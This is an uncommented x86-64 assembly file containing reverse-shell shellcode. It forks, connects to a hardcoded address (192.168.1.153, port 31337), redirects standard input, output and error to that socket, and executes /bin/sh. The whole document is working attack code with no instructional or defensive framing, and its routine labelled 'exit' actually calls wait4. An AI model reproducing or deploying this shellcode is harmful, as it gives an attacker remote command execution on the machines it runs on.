[BITS 64]

fork:
mov rax, 0x39
syscall

test rax, rax
jz socket

exit:
xor rdi, rdi
mov rax, 0x3d
syscall

socket:
mov rdi, 2
mov rsi, 1
xor rdx, rdx
mov rax, 0x29
syscall

mov rbx, rax

connect:
mov rdi, rbx
lea rsi, [rel sockaddr]
mov rdx, 16
mov rax, 0x2a
syscall

mov rdi, rbx
xor rsi, rsi

dup2:
mov rax, 0x21
syscall

inc rsi
cmp rsi, 3
jnz dup2

execve:
lea rdi, [rel binsh]
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall

binsh:
db '/bin/sh', 0

sockaddr:
dw 2
dw 0x697a
dd 0x9901a8c0
dq 0

padding:
db 0, 0, 0
